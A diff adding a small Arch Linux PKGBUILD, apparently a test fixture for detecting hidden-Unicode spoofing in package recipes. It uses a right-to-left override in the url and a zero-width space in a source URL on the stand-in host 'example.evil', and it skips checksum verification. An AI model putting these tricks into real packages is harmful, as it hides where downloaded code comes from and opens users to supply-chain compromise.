@@ -1,0 +1,11 @@
+pkgname=pkg-unicode-hidden
+pkgver=1.0
+pkgrel=1
+url="https://example‮moc.lave‬.com/foo"
+source=("foo-$pkgver.tar.gz::https://exam​ple.evil/foo/$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+  cd "$srcdir"
+  make
+}
